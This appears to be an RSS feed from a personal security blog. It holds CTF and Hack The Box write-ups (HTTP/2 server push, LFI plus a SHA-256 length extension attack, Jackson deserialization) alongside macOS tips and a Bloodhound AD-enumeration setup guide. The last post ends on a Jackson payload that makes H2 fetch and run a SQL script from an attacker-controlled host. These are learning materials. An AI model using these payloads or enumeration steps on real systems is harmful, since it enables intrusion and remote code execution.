value and whether or not the <code>Shift</code> key was pressed</li><li>maps the key value and shift to the corresponding symbol on the keyboard</li><li>removes the temporary file</li><li>prints the resulting string</li></ol><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/662442da446c3f79e19bca9bd82ea7d1.js"></script><!--kg-card-end: html--><p>As an example:</p><pre><code>~ python3 mousejack.py -f mousejack.pcapng -t /Applications/Wireshark.app/Contents/MacOS/tshark

&gt; flag{usb_sniff_sniff}</code></pre>]]></content:encoded></item><item><title><![CDATA[Setting up Bloodhound on macOS]]></title><description><![CDATA[<p>On a recent CTF I needed to set up Bloodhound on macOS and came across some issues. Hope this helps someone in need. :)</p><hr><h2 id="installing-a-compatible-python-version">Installing a compatible Python version</h2><p>Because of the way in which <code>Python 3.8</code> handles multiprocessing in macOS you need to downgrade to <code>Python 3.7.3</code></p>]]></description><link>inesmartins.github.io/setting-up-bloodhound-on-macos/</link><guid isPermaLink="false">60d8afdeeb71c50b03cada18</guid><category><![CDATA[bloodhound]]></category><category><![CDATA[windows]]></category><category><![CDATA[ad]]></category><category><![CDATA[macOS]]></category><category><![CDATA[tips]]></category><category><![CDATA[troubleshooting]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 11 Jul 2021 13:37:13 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/bloodhound-logo.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/bloodhound-logo.png" alt="Setting up Bloodhound on macOS"><p>On a recent CTF I needed to set up Bloodhound on macOS and came across some issues. Hope this helps someone in need. :)</p><hr><h2 id="installing-a-compatible-python-version">Installing a compatible Python version</h2><p>Because of the way in which <code>Python 3.8</code> handles multiprocessing in macOS you need to downgrade to <code>Python 3.7.3</code> to be able to use <code>Bloodhound.py</code>.</p><p>Here&apos;s a great StackOverflow answer that explains how to do this downgrade using <code>pyenv</code>:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://stackoverflow.com/a/62899833"><div class="kg-bookmark-content"><div class="kg-bookmark-title">How to downgrade python version from 3.8 to 3.7 (mac)</div><div class="kg-bookmark-description">I&#x2019;m using Python &amp;amp; okta-aws tools and in order to fetch correct credentials on aws I need to run okta-aws init. But got an error message of Could not read roles from Okta and the system prompte...</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon.png?v=c78bd457575a" alt="Setting up Bloodhound on macOS"><span class="kg-bookmark-author">Stack Overflow</span><span class="kg-bookmark-publisher">user13902742</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded" alt="Setting up Bloodhound on macOS"></div></a></figure><p>After this process you should now have something like:</p><pre><code>~ python3 --version
Python 3.7.3</code></pre><hr><h2 id="collecting-the-data">Collecting the data</h2><p>On Windows, data collection is done with <a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html">SharpHound</a>:</p><blockquote>SharpHound is the official data collector for BloodHound. It is written in C# and uses native Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems.</blockquote><p>On macOS, you can use <code>Bloodhoud.py</code>, but you also need an additional tool that resolves the AD domain to its IP. I went with <code>DNSChef</code> but you can choose whatever works best.</p><p>So, start by cloning the <a href="https://github.com/fox-it/BloodHound.py">Bloodhound<a href="https://github.com/fox-it/BloodHound.py">.</a>py</a> and <a href="https://github.com/iphelix/dnschef">dnschef.py</a> projects and install the requirements as specified on the <code>README.md</code> files.</p><p>Once both projects are correctly installed, you need to set up <a href="https://github.com/iphelix/dnschef">dnschef.py</a> so that it resolves your AD domain to its corresponding IP, as previously mentioned:</p><pre><code>~ sudo sh -c &apos;python3 dnschef.py --fakeip x.x.x.x --fakedomains abc.local -q&apos;

(20:14:25) [*] DNSChef started on interface: 127.0.0.1
(20:14:25) [*] Using the following nameservers: 8.8.8.8
(20:14:25) [*] Cooking A replies to point to x.x.x.x matching: abc.local
</code></pre><p>Next, you can run the Bloodhound script, but make sure to point to your &quot;fake&quot; nameserver:</p><pre><code>~ python3 ../bloodhound.py -d abc.local -u theusername -p &apos;thepassword&apos; -dc abc.local -c all -ns 127.0.0.1

INFO: Connecting to LDAP server: abc.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: abc.local
INFO: Found 7 users
INFO: Found 53 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: XXX1.abc.local
INFO: Querying computer: XXX2.abc.local
INFO: Ignoring host XXX1.abc.local since its hostname does not match: Supplied hostname XXX1.abc.local does not match reported hostnames dc1 or dc1.abc.local
INFO: Done in 00M 08S</code></pre><p>This process should output some <code>.json</code> files to your local directory. You&apos;ll be able to import and visualise the data on the next step.</p><hr><h2 id="visualising-the-data">Visualising the data</h2><p>Start by downloading the macOS versions of both <a href="https://neo4j.com/download-center/#community">neo4j Community Edition Server</a> and <a href="https://github.com/BloodHoundAD/BloodHound/releases">Bloodhound GUI</a>.</p><p>Then, go to the directory where you downloaded <code>neo4j</code> and run:</p><pre><code>~ tar -xf neo4j-community-x.x.x-unix.tar
~ cd neo4j-community-x.x.x/bin
~ ./neo4j console</code></pre><p>Once the <code>neo4j</code> console application is running, go to <a href="http://localhost:7474">http://localhost:7474</a> and authenticate with credentials: <code>neo4j/neo4j</code>. </p><p>You&apos;ll be prompted to change the password, so make sure to save these new creds, you&apos;ll need for the next step.</p><p>Now, go to the directory where you downloaded <code>Bloodhound GUI</code> and launch the app. </p><p>Leave the default DB URL and enter the same credentials you just set up for <code>neo4j</code>.</p><p>After logging in, on the right side, you&apos;ll see an icon to upload data. Click on the icon and import the <code>.json</code> files outputted on the previous step.</p><p>You should now have everything you need to visualise your AD info using Bloodhound! </p>]]></content:encoded></item><item><title><![CDATA[Update: Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p>]]></description><link>inesmartins.github.io/simplest-way-to-host-your-ghost-blog-on-github-pages/</link><guid isPermaLink="false">60c5dd95eb71c50b03caced6</guid><category><![CDATA[ghost]]></category><category><![CDATA[github pages]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 13 Jun 2021 10:38:48 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-15.02.38.png" alt="Update: Simplest way to host your Ghost blog on GitHub Pages"><p>Last year I <a href="https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/">created a post</a> about how to get a Ghost blog up and running on Github Pages without much effort.</p><p>This worked well, but after being forced to update <a href="https://www.npmjs.com/package/ghost-cli">ghost-cli</a> to version <code>1.17.3</code> I ran into a few issues and had to rethink the entire process.</p><p>Luckily, I found an even simpler way to do it.</p><p>Assuming you have a local instance of Ghost running on the default port <code>2368</code>:</p><ul><li>Make sure you have <a href="https://www.gnu.org/software/wget/">wget</a> installed</li><li>Add this script to your directory but make sure to replace <code>yourdomain.com</code> with your actual Github Pages domain, e.g.: <code>inesmartins.github.io</code>:</li></ul><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/6f90f6a2812c7727d25ae3f9a3771b35.js"></script><!--kg-card-end: html--><p>(based on script from <a href="https://fizzy.cc/ghost-static-generator/">fizzy.cc</a>)</p><p>This script generate a <code>static</code> directory with the entire content of your Ghost instance as a static website. Just copy this content to the Github Pages repository, and your website will be instantly updated.</p><p>In order to make this process even easier, I created an NPM script, which makes this as easy as running: <code>npm run publish</code> on your original repository:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/7fbd5dc9ed1cc418d27386559581cd43.js"></script><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - HTTP2]]></title><description><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-84.png 600w, inesmartins.github.io/content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-85.png 600w, inesmartins.github.io/content/images/2021/05/image-85.png 788w"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol,</p>]]></description><link>inesmartins.github.io/oposec-http2/</link><guid isPermaLink="false">60aa1e4ce1e20f0a69e2a808</guid><category><![CDATA[oposec]]></category><category><![CDATA[http2]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 28 May 2021 11:30:46 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><img src="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1.jpeg" alt="&#xD8;xOPOS&#x246;C - HTTP2"><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-84.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="860" height="352" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-84.png 600w, inesmartins.github.io/content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-85.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="788" height="123" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-85.png 600w, inesmartins.github.io/content/images/2021/05/image-85.png 788w"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol, so it makes sense that this challenge is about some HTTP feature, either new or deprecated.</p><p>Using <code>curl</code> to fetch the page we see that it&apos;s served via <code>HTTP/2</code>, which is still kind of rare in the wild:</p><pre><code>~ curl -ik https://20.56.49.147/
HTTP/2 200
server: nginx/1.19.10
date: Fri, 28 May 2021 11:27:17 GMT
content-type: text/html
content-length: 129
last-modified: Thu, 20 May 2021 10:10:20 GMT
etag: &quot;60a6358c-81&quot;
accept-ranges: bytes

&lt;img src=&quot;https://raw.githubusercontent.com/verhas/pushbuilder/master/http-versions.png&quot;&gt;
&lt;!-- Lost? It&apos;s evolution, baby... --&gt;</code></pre><p><code>HTTP/2</code> supports the <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">Server Push</a> feature, which basically enables servers to send assets to the client without the client having to request them, which is the perfect setup for a hidden file, like the flag.</p><p>In order to log these &quot;hidden&quot; request, we can use <a href="chrome://net-export/">Chrome Net Export tool</a>:</p><ul><li>Open up a new Chrome tab and enter <code>chrome://net-export/</code>:</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-86.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="1167" height="415" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-86.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-86.png 1000w, inesmartins.github.io/content/images/2021/05/image-86.png 1167w"></figure><ul><li>Click &quot;Start Logging to Disk&quot; and choose the file where you want to write on your computer;</li><li>Go to the challenge website and reload it;</li><li>Go back to the Chrome Net Export tool and click &quot;Stop Logging&quot;;</li><li>Click &quot;Show file&quot; to see the log file;</li><li>Search for the word <code>flag</code> among the results:</li></ul><pre><code>...
{
   &quot;params&quot;:{
      &quot;headers&quot;:[
         &quot;:method: GET&quot;,
         &quot;:path: /flag_652f92e28feb20d2dc22874d54cefb9b0cf96ce5c65552161fdaad4a33776394.txt&quot;,
         &quot;:scheme: https&quot;,
         &quot;:authority: 20.56.49.147&quot;,
         &quot;accept-encoding: gzip, deflate, br&quot;,
         &quot;accept-language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7&quot;,
         &quot;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot;
      ],
      &quot;id&quot;:1,&quot;promised_stream_id&quot;:2
   },
   ...
},
...</code></pre><ul><li>Access the resource and get the flag:</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-87.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - HTTP2" loading="lazy" width="951" height="92" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-87.png 600w, inesmartins.github.io/content/images/2021/05/image-87.png 951w"></figure><p>Note that alternatively, we could have simply used <a href="https://nghttp2.org/">Nghttp2</a>.</p>]]></content:encoded></item><item><title><![CDATA[Fixing keyboard type on Big Sur]]></title><description><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go</li></ul>]]></description><link>inesmartins.github.io/fixing-keyboard-type-on-big-sur/</link><guid isPermaLink="false">609fdd03f0e974043bb7b5c0</guid><category><![CDATA[macOS]]></category><category><![CDATA[troubleshooting]]></category><category><![CDATA[keyboard type]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 15 May 2021 14:56:08 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/07/1-1.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/07/1-1.png" alt="Fixing keyboard type on Big Sur"><p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go to <code>/Library/Preferences</code> and see if you can find <code>com.apple.keyboardtype.plist</code></li></ul><pre><code>~ cd /Library/Preferences
~ ls | grep keyboard</code></pre><ul><li>Either remove it or move it somewhere else (if you want to have a backup)</li></ul><pre><code>~ sudo rm com.apple.keyboardtype.plist</code></pre><ul><li>Restart the computer</li><li>You&apos;ll be prompted to setup your keyboard again</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/1-1.png" class="kg-image" alt="Fixing keyboard type on Big Sur" loading="lazy" width="700" height="510" srcset="inesmartins.github.io/content/images/size/w600/2021/05/1-1.png 600w, inesmartins.github.io/content/images/2021/05/1-1.png 700w"></figure><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/2.png" class="kg-image" alt="Fixing keyboard type on Big Sur" loading="lazy" width="723" height="530" srcset="inesmartins.github.io/content/images/size/w600/2021/05/2.png 600w, inesmartins.github.io/content/images/2021/05/2.png 723w" sizes="(min-width: 720px) 720px"></figure><ul><li>Confirm your keyboard type and that&apos;s it</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/3.png" class="kg-image" alt="Fixing keyboard type on Big Sur" loading="lazy" width="686" height="512" srcset="inesmartins.github.io/content/images/size/w600/2021/05/3.png 600w, inesmartins.github.io/content/images/2021/05/3.png 686w"></figure>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - Don Joe [Crypto]]]></title><description><![CDATA[<blockquote>Don Joe insists his site is as secure as can be! Can you prove that the best web dev of all time is wrong?&quot;<br>URL: <a href="https://don-joes-blog.herokuapp.com/" rel="noopener noreferrer">https://don-joes-blog.herokuapp.com/</a> <br>There are two flags</blockquote><p>Don Joe&apos;s Blog has a very simple interface and lists only 4 blog posts:</p>]]></description><link>inesmartins.github.io/oposec-don-joe/</link><guid isPermaLink="false">6070c230e97e6981d27339e2</guid><category><![CDATA[crypto]]></category><category><![CDATA[cryptography]]></category><category><![CDATA[sha2]]></category><category><![CDATA[sha256]]></category><category><![CDATA[hashpump]]></category><category><![CDATA[hash_extender,]]></category><category><![CDATA[length extension attack]]></category><category><![CDATA[owasp zap]]></category><category><![CDATA[LFI]]></category><category><![CDATA[oposec]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 01 May 2021 09:38:18 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>Don Joe insists his site is as secure as can be! Can you prove that the best web dev of all time is wrong?&quot;<br>URL: <a href="https://don-joes-blog.herokuapp.com/" rel="noopener noreferrer">https://don-joes-blog.herokuapp.com/</a> <br>There are two flags</blockquote><img src="inesmartins.github.io/content/images/2021/06/highres_471963990-1-1-1.jpeg" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]"><p>Don Joe&apos;s Blog has a very simple interface and lists only 4 blog posts:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-3.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>Clicking on the articles we can see that they&apos;re being fetched using the <code>id</code> query parameter:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-4.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>Luckily I didn&apos;t even have to do any tests, <a href="https://www.zaproxy.org/">OWASP Zap</a> immediately let me know how to exploit this <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">LFI vulnerability</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/04/image-5.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>So, let&apos;s see what we can find on <code>etc/passwd</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/04/image-6.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>One flag down!</p><hr><h2 id="m4st3rfully_h1dd3n">m4st3rfully_h1dd3n</h2><p>When we go to the <a href="http://don-joes-blog.herokuapp.com/m4st3rfully_h1dd3n">m4st3rfully_h1dd3n</a> directory we find the project&apos;s source code:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-7.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>As instructed, let&apos;s login as <code>supreme_user</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-8.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>After logging in we see the same &quot;hidden&quot; home page, but now authenticated as <code>supreme_user</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-9.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>The session is maintained using a cookie called <code>auth</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/04/image-10.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>When we base64-decode the cookie (<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&apos;A-Za-z0-9%2B/%3D&apos;,true)&amp;input=ZFhObGNtNWhiV1U5YzNWd2NtVnRaVjkxYzJWeU8zTmxZM0psZEQxaFpqTTFNV1kwTkRNeE16Qm1Nelk1WXpCalpHVTVPREl4TVRCaE1EZGlZamhtT0RneE1USmpZMlppTUdJNU1qTTJaV0ZqTVdVeVlUSXpZMkl3TlRReE93PT0">using CyberChef</a>) we see the authenticated user data plus some encrypted data, which should be some sort of checksum:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/04/image-1.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><hr><h2 id="analysing-the-source-code">Analysing the source code</h2><p>Looking at the source code we can see that there is a user DB (<code>users_db.py</code>) with 2 users, <code>supreme_user</code> and <code>admin</code>:</p><pre><code>{&quot;username&quot;: &quot;supreme_user&quot;, &quot;password&quot;: &quot;af351f443130f369c0cde982110a07bb8f88112ccfb0b9236eac1e2a23cb0541&quot;, &quot;role&quot;: 0},
{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;2ae3a0f2ef89bf388e7cdc7f5fc9f1b60e5542d0a6c2f6f1cf88190d0ab2b711&quot;, &quot;role&quot;: 1}
</code></pre><p>Searching for flag-related methods we see the <code>admin_flag()</code> function, which is triggered by navigating to the <code>admin</code> route. In short, if the user is authenticated as <code>admin</code> the application renders the final flag, else it displays the &quot;Forbidden&quot; route page:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-11.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>The <code>is_admin</code> function:</p><ol><li>checks for a valid session;</li><li>checks that there&apos;s a user that matches the session;</li><li>prints some debug info;</li><li>returns <code>true</code> if the user role is <code>1</code>, which from what we can see is only true for the <code>admin</code> user.</li></ol><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-12.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>The <code>get_session</code> function checks the <code>auth</code> cookie and then returns the parsed data:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-13.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>The <code>parse_session</code> function:</p><ol><li>splits the cookie into data and signature;</li><li><code>base64</code>-decodes both parts of the cookie;</li><li>checks that the data matches the signature;</li><li>returns all the fields on the decoded data as a dictionary.</li></ol><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-14.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>Now for the signature checking, it seems like the data is appended to some random <code>SECRET</code> value and then hashed using <code>SHA-256</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-15.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-16.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>However, the <code>SECRET</code> is not easily brute-forceable since it contains between 8 and 15 random bytes:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-17.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><hr><h2 id="length-extension-attack">Length Extension Attack</h2><blockquote>TL;DR: given a hash that is composed of a string with an unknown prefix, an attacker can append to the string and produce a new hash that still has the unknown prefix. [<a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">Source</a>]</blockquote><p>Knowing that this vulnerability affects <code>SHA-256</code>, we can create a script that:</p><ol><li>retrieves a valid <code>auth</code> cookie for the <code>supreme_user</code> by authenticating with the known credentials;</li></ol><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-21.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>2. for all possible lengths of <code>SECRET</code>, uses <a href="https://github.com/iagox86/hash_extender">hash_extender</a> to create valid cookies with the admin authentication data (username and hashed password):</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/04/image-24.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>3. for each of the cookies, try to access the <code>admin</code> route and see if one of the cookies is a valid form of authentication:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-26.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p>4. Putting it all together we get a hit!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/04/image-25.png" class="kg-image" alt="&#xD8;xOPOS&#x246;C - Don Joe [Crypto]" loading="lazy"></figure><p><br></p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Time]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb

PORT   STATE SERVICE VERSION
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-time/</link><guid isPermaLink="false">5f95bf0d501631398681f989</guid><category><![CDATA[htb]]></category><category><![CDATA[jackson]]></category><category><![CDATA[deserialization]]></category><category><![CDATA[deserialisation]]></category><category><![CDATA[fasterxml]]></category><category><![CDATA[json]]></category><category><![CDATA[h2]]></category><category><![CDATA[sql]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 03 Apr 2021 13:50:00 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/04/banner.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2021/04/banner.png" alt="HTB Write-up | Time"><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb

PORT   STATE SERVICE VERSION
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser</code></pre><p>When we access the website, we see a simple JSON &quot;beautifier&quot; and validator.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2020/10/image-2.png" class="kg-image" alt="HTB Write-up | Time" loading="lazy"></figure><p>After submitting a couple of invalid JSON objects, it was clear from the error responses that the JSON was being parsed and validated using <a href="https://github.com/FasterXML/jackson-docshttps://github.com/FasterXML/jackson">Jackson</a>:</p><pre><code>Validation failed: Unhandled Java exception:
com.fasterxml.jackson.databind.exc.MismatchedInputException: 
Unexpected token (START_OBJECT), expected VALUE_STRING: 
need JSON String that contains type id (for subtype of java.lang.Object)</code></pre><p>Turns out this parser has <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-34008/Fasterxml-Jackson.html">3 CVEs</a>, all to do with deserialisation vulnerabilities.</p><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">This</a> is a very good article that explains the root of these vulnerabilities and how to exploit them.</p><hr><h2 id="exploiting-jackson">Exploiting Jackson</h2><p>Since this version of Jackson already blocklists some insecure types, I had to rely on <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">this</a> BlackHat presentation from 2019 to find a valid exploit:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2020/11/image-1.png" class="kg-image" alt="HTB Write-up | Time" loading="lazy"></figure><p>After going through <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">this</a> article, I realised that the easiest way to achieve an RCE using <code>DriverManagerConnectionSource</code> would be to abuse H2&apos;s <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">INIT=RUNSCRIPT FROM</a> feature. </p><p>Using this option, a database can be initialised with a SQL file that&apos;s hosted on the attacker&apos;s machine (I used <code>python -m SimpleHTTPServer 8000</code> to serve it).</p><pre><code class="language-JSON">[
    &quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, 
    {
    	&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &apos;http://[attacker-ip]:8000/inject.sql&apos;&quot;
     }
